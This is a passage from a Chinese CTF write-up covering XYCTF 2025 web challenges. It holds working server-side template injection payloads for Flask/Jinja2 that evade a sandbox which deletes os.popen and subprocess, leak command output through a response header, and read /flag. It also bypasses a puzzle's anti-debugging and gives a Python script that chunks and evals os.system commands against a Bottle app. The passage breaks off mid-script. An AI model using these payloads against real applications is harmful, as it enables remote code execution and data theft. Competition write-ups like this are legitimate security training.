class="keyword">if</span> quote:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> quote.startswith(<span class="string">&quot;fly-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> quote:</span><br><span class="line">                        <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;wouldn&#x27;t it be easier to give in?&quot;</span></span><br><span class="line">                time.sleep(random.randint(<span class="number">10</span>, <span class="number">30</span>) / <span class="number">10</span>)  <span class="comment"># No time based injections.</span></span><br><span class="line">                flask.render_template_string(<span class="string">&#x27;Let-the-magic-&#123;#&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;quote&#125;</span>&#x27;</span> + <span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Registered endpoints and functions:&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> endpoint, func <span class="keyword">in</span> app.view_functions.items():</span><br><span class="line">                    <span class="keyword">if</span> endpoint <span class="keyword">not</span> <span class="keyword">in</span> allowed_endpoint:</span><br><span class="line">                        <span class="keyword">del</span> func  <span class="comment"># No creating backdoor functions &amp; endpoints.</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="string">f&#x27;What are you doing with <span class="subst">&#123;endpoint&#125;</span> hacker?&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Let the true magic begin!&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>这里把回显去掉了，那么就有时间盲注、请求头回显、内存马、弹shell、写文件的方法。</p><p>这里给出一个请求头回显的基础payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.__builtins__.setattr(lipsum.__globals__.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,&quot;protocol_version&quot;,lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read())&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里没有回显，我们根本读不到config的内容了，那么怎么办呢？其实还有一种叫<code>endpoint</code></p><p><a href="https://flask.palletsprojects.com/en/stable/api/#flask.Request.endpoint">https://flask.palletsprojects.com/en/stable/api/#flask.Request.endpoint</a></p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409125208662.png" class="" title="This is an example image"><p>我们现在本地看看效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?spell=fly-%23%7D&#123;%print(request.endpoint)%&#125;%7B%23 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br></pre></td></tr></table></figure><p>回显如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.10</span><br><span class="line">Date: Wed, 09 Apr 2025 04:53:31 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">Let-the-magic-r3al_ins1de_th0ught</span><br></pre></td></tr></table></figure><p>它的回显要去除掉<code>Let-the-magic-</code>，<code>r3al_ins1de_th0ught</code>才是<code>request.endpoint</code>的值，也就是路由的函数名，那么我们就可以开始构造了。</p><p>这么点字符肯定是不够的，我们用<code>request.url</code>也可以，用<code>request.data</code>等其实都可以。data就是获取POST传入的参数，可能会比较好观察，那么我们这里就用data。</p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409130600540.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>然后开始构造请求头回显的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?spell=fly-%23%7D&#123;%for%0ai%0ain%0arequest.endpoint|string|slice(1)%&#125;&#123;%set%0adat=i.9~i.2~i.18~i.2%&#125;&#123;%for%0aj%0ain%0arequest|attr(dat)|string|slice(1)%&#125;&#123;%set%0alip=j.22~j.19~j.26~j.29~j.31~j.23%&#125;&#123;%set%0aglo=j.37~j.37~j.17~j.22~j.25~j.0~j.11~j.22~j.29~j.37~j.37%&#125;&#123;%set%0abuil=j.37~j.37~j.0~j.31~j.19~j.22~j.30~j.19~j.24~j.29~j.37~j.37%&#125;&#123;%set%0aset=j.29~j.15~j.30~j.11~j.30~j.30~j.28%&#125;&#123;%set%0aspe=j.37~j.37~j.29~j.26~j.15~j.13~j.37~j.37%&#125;&#123;%set%0aini=j.37~j.37~j.19~j.24~j.19~j.30~j.37~j.37%&#125;&#123;%set%0as=j.29~j.35~j.29%&#125;&#123;%set%0amod=j.23~j.25~j.14~j.31~j.22~j.15~j.29%&#125;&#123;%set%0awer=j.33~j.15~j.28~j.21~j.36~j.15~j.31~j.17%&#125;&#123;%set%0aget=j.37~j.37~j.17~j.15~j.30~j.19~j.30~j.15~j.23~j.37~j.37%&#125;&#123;%set%0aserv=j.29~j.15~j.28~j.32~j.19~j.24~j.17%&#125;&#123;%set%0awsg=j.41~j.42~j.43~j.44~j.45~j.15~j.27~j.31~j.15~j.29~j.30~j.46~j.11~j.24~j.14~j.22~j.15~j.28%&#125;&#123;%set%0averi=j.26~j.28~j.25~j.30~j.25~j.13~j.25~j.22~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0aso=j.25~j.29%&#125;&#123;%set%0asv=j.29~j.15~j.28~j.32~j.15~j.28~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0apen=j.26~j.25~j.26~j.15~j.24%&#125;&#123;%set%0aap=j.11~j.26~j.26~j.22~j.19~j.13~j.11~j.30~j.19~j.25~j.24%&#125;&#123;%set%0aop=j.26~j.25~j.26%&#125;&#123;%set%0aim=j.37~j.37~j.19~j.23~j.26~j.25~j.28~j.30~j.37~j.37%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(set)(g|attr(op)|attr(glo)|attr(get)(s)|attr(mod)|attr(get)(wer)|attr(serv)|attr(wsg),veri,g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)))%&#125;&#123;%endfor%&#125;&#123;%endfor%&#125;%7B%23 HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20003</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;WSGIRH</span><br></pre></td></tr></table></figure><p>好累啊！！！成功一半了，接下来就是处理被删除的<code>popen</code>。</p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409142739311.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?spell=fly-%23%7D&#123;%for%0ai%0ain%0arequest.endpoint|string|slice(1)%&#125;&#123;%set%0adat=i.9~i.2~i.18~i.2%&#125;&#123;%for%0aj%0ain%0arequest|attr(dat)|string|slice(1)%&#125;&#123;%set%0alip=j.22~j.19~j.26~j.29~j.31~j.23%&#125;&#123;%set%0aglo=j.37~j.37~j.17~j.22~j.25~j.0~j.11~j.22~j.29~j.37~j.37%&#125;&#123;%set%0abuil=j.37~j.37~j.0~j.31~j.19~j.22~j.30~j.19~j.24~j.29~j.37~j.37%&#125;&#123;%set%0aset=j.29~j.15~j.30~j.11~j.30~j.30~j.28%&#125;&#123;%set%0aspe=j.37~j.37~j.29~j.26~j.15~j.13~j.37~j.37%&#125;&#123;%set%0aini=j.37~j.37~j.19~j.24~j.19~j.30~j.37~j.37%&#125;&#123;%set%0as=j.29~j.35~j.29%&#125;&#123;%set%0amod=j.23~j.25~j.14~j.31~j.22~j.15~j.29%&#125;&#123;%set%0awer=j.33~j.15~j.28~j.21~j.36~j.15~j.31~j.17%&#125;&#123;%set%0aget=j.37~j.37~j.17~j.15~j.30~j.19~j.30~j.15~j.23~j.37~j.37%&#125;&#123;%set%0aserv=j.29~j.15~j.28~j.32~j.19~j.24~j.17%&#125;&#123;%set%0awsg=j.41~j.42~j.43~j.44~j.45~j.15~j.27~j.31~j.15~j.29~j.30~j.46~j.11~j.24~j.14~j.22~j.15~j.28%&#125;&#123;%set%0averi=j.26~j.28~j.25~j.30~j.25~j.13~j.25~j.22~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0aso=j.25~j.29%&#125;&#123;%set%0asv=j.29~j.15~j.28~j.32~j.15~j.28~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0apen=j.26~j.25~j.26~j.15~j.24%&#125;&#123;%set%0aap=j.11~j.26~j.26~j.22~j.19~j.13~j.11~j.30~j.19~j.25~j.24%&#125;&#123;%set%0aop=j.26~j.25~j.26%&#125;&#123;%set%0aim=j.37~j.37~j.19~j.23~j.26~j.25~j.28~j.30~j.37~j.37%&#125;&#123;%set%0aiml=j.19~j.23~j.26~j.25~j.28~j.30~j.22~j.19~j.0%&#125;&#123;%set%0aloa=j.28~j.15~j.22~j.25~j.11~j.14%&#125;&#123;%set%0ard=j.28~j.15~j.11~j.14%&#125;&#123;%set%0aco=j.22~j.29~j.47~j.48%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(iml)|attr(loa)(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)))%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(set)(g|attr(op)|attr(glo)|attr(get)(s)|attr(mod)|attr(get)(wer)|attr(serv)|attr(wsg),veri,g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)|attr(pen)(co)|attr(rd)()))%&#125;&#123;%endfor%&#125;&#123;%endfor%&#125;%7B%23 HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;WSGIRH /</span><br></pre></td></tr></table></figure><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409143622617.png" class="" title="This is an example image"><p>其实上述payload几乎是可以直接拿去用的，只需要改一下data的构造和command的构造即可。</p><p>然后我们用base64命令来读取<code>/flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?spell=fly-%23%7D&#123;%for%0ai%0ain%0arequest.endpoint|string|slice(1)%&#125;&#123;%set%0adat=i.9~i.2~i.18~i.2%&#125;&#123;%for%0aj%0ain%0arequest|attr(dat)|string|slice(1)%&#125;&#123;%set%0alip=j.22~j.19~j.26~j.29~j.31~j.23%&#125;&#123;%set%0aglo=j.37~j.37~j.17~j.22~j.25~j.0~j.11~j.22~j.29~j.37~j.37%&#125;&#123;%set%0abuil=j.37~j.37~j.0~j.31~j.19~j.22~j.30~j.19~j.24~j.29~j.37~j.37%&#125;&#123;%set%0aset=j.29~j.15~j.30~j.11~j.30~j.30~j.28%&#125;&#123;%set%0aspe=j.37~j.37~j.29~j.26~j.15~j.13~j.37~j.37%&#125;&#123;%set%0aini=j.37~j.37~j.19~j.24~j.19~j.30~j.37~j.37%&#125;&#123;%set%0as=j.29~j.35~j.29%&#125;&#123;%set%0amod=j.23~j.25~j.14~j.31~j.22~j.15~j.29%&#125;&#123;%set%0awer=j.33~j.15~j.28~j.21~j.36~j.15~j.31~j.17%&#125;&#123;%set%0aget=j.37~j.37~j.17~j.15~j.30~j.19~j.30~j.15~j.23~j.37~j.37%&#125;&#123;%set%0aserv=j.29~j.15~j.28~j.32~j.19~j.24~j.17%&#125;&#123;%set%0awsg=j.41~j.42~j.43~j.44~j.45~j.15~j.27~j.31~j.15~j.29~j.30~j.46~j.11~j.24~j.14~j.22~j.15~j.28%&#125;&#123;%set%0averi=j.26~j.28~j.25~j.30~j.25~j.13~j.25~j.22~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0aso=j.25~j.29%&#125;&#123;%set%0asv=j.29~j.15~j.28~j.32~j.15~j.28~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0apen=j.26~j.25~j.26~j.15~j.24%&#125;&#123;%set%0aap=j.11~j.26~j.26~j.22~j.19~j.13~j.11~j.30~j.19~j.25~j.24%&#125;&#123;%set%0aop=j.26~j.25~j.26%&#125;&#123;%set%0aim=j.37~j.37~j.19~j.23~j.26~j.25~j.28~j.30~j.37~j.37%&#125;&#123;%set%0aiml=j.19~j.23~j.26~j.25~j.28~j.30~j.22~j.19~j.0%&#125;&#123;%set%0aloa=j.28~j.15~j.22~j.25~j.11~j.14%&#125;&#123;%set%0ard=j.28~j.15~j.11~j.14%&#125;&#123;%set%0aco=j.0~j.11~j.29~j.15~j.7~j.5~j.47~j.48~j.16~j.49%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(iml)|attr(loa)(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)))%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(set)(g|attr(op)|attr(glo)|attr(get)(s)|attr(mod)|attr(get)(wer)|attr(serv)|attr(wsg),veri,g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)|attr(pen)(co)|attr(rd)()))%&#125;&#123;%endfor%&#125;&#123;%endfor%&#125;%7B%23 HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20051</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;WSGIRH /*</span><br></pre></td></tr></table></figure><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409144049671.png" class="" title="This is an example image"><p>把图片下载下载，感觉flag已经到手了。。</p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409150146227.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;__M@g1c1@ans_M@stering_M@g1c__&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><p>这道题f12和右键都不行，连在其他页面打开f12再转到题目界面也不行。还能用快捷键来打开，<code>ctrl+shift+i</code></p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250408155014946.png" class="" title="This is an example image"><p>打开源代码后会停在一个debugger的地方，然后一直循环，这是一个反调试的措施。我们可以选中这段代码右键进行忽略，这样我们就不能调试了。</p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250408155106925.png" class="" title="This is an example image"><p>我们全局搜一下alert看看</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (G &lt; yw4) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(O[s74](<span class="variable constant_">J74</span>))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>($vfeRha_calc(<span class="variable constant_">S74</span> + G / <span class="title class_">Rw4</span>, <span class="variable constant_">Y74</span>, $v5sNVR(vS4)))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">void</span> (O[t74] = !<span class="number">0x1</span>,</span><br><span class="line">    location[<span class="variable constant_">K74</span>]())</span><br></pre></td></tr></table></figure><p>发现yw4的值是2000，那么第一个alert里面的东西肯定就是flag了，但是我们上面有反调试，将其忽略后我们打断点也没有用了，那怎么办呢？只能正常进行，但是时间是可以更改的。</p><p>那我们直接把yw4改成超级大</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yw4=9999999999999</span><br></pre></td></tr></table></figure><p>然后拼好拼图就拿到了flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!&#125;</span><br></pre></td></tr></table></figure><h2 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯"></a>出题人已疯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>只限制了字数，<code>open</code>和<code>\</code>，跟vnctf有点像，但是vnctf是有多行的，可以用海象运算法来进行拼接从而绕过字数限制。但是这里只有一行。</p><p>我们继续用拼接的方法来实现！</p><p>我们用<code>%</code>的方法，因为字数最短！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /attack?payload=%0a%import%20bottle;bottle.c=&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot; HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /attack?payload=%0a%import%20bottle;eval(bottle.c) HTTP/1.1</span><br></pre></td></tr></table></figure><p>服务端回显如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [09/Apr/2025 11:17:37] &quot;GET /attack?payload=%0a%import%20bottle;bottle.c=&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot; HTTP/1.1&quot; 200 7</span><br><span class="line">127.0.0.1 - - [09/Apr/2025 11:17:58] &quot;GET /attack?payload=%0a%import%20bottle;eval(bottle.c) HTTP/1.1&quot; 200 7</span><br><span class="line">meteor-kai\ty</span><br></pre></td></tr></table></figure><p>这里有<code>%0a</code>的原因是因为<code>%</code>被嵌入在普通文本中，因此要先换行。</p><p>那么我们接下来拼接一下<code>bottle.c</code>的命令即可。</p><p>同时既然要字数少，我们找一个字数最短的模块，也就是<code>os</code>！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://gz.imxbt.cn:20994/attack&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123.txt&#x27;)&quot;</span></span><br><span class="line">payload=[payload[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload),<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="comment">#print(tmp)</span></span><br><span class="line">        r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a+=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="comment">#print(tmp)</span></span><br><span class="line">        r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">f&quot;\n%import os;eval(os.a)&quot;</span></span><br><span class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">f&quot;\n%include(&#x27;123.txt&#x27;)&quot;</span></span><br><span class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>构造脚本的时候遇到了一个小坑，就是以下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmp=<span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>此处包裹<code>&#123;payload[i]&#125;</code>的引号必须为双引号，因为python内部解析时是使用单引号的，如果这里包裹使用单引号会造成一种混淆。</p><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409121045215.png" class="" title="This is an example image"><p>这里如果长度限制放宽一点，也可以用system来命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:5000/attack&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;whoami&quot;</span></span><br><span class="line">payload=[payload[i:i+<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload),<span class="number">3</span>)]</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="comment">#print(tmp)</span></span><br><span class="line">        r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a+=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="comment">#print(tmp)</span></span><br><span class="line">        r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">f&quot;\n%import os;print(os.a)&quot;</span></span><br><span 